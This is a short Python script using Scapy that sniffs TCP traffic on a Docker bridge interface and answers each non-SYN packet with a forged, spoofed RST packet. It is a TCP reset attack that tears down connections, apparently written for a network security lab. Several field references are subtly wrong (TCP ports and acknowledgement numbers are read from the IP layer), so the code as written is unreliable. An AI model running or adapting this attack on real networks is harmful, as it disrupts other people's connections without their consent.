#!/usr/bin/env python3
from scapy.all import *

def callback(pkt):
    if pkt[TCP].flags != "S":
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[IP].dport, dport=pkt[IP].sport, flags="R", seq=pkt[IP].ack, ack=(int(pkt[IP].ack)-1))
        pkt = ip/tcp
        ls(pkt)
        send(pkt,verbose=0)

pkt = sniff(iface='br-9ee9c232b895', filter="tcp", prn=callback)
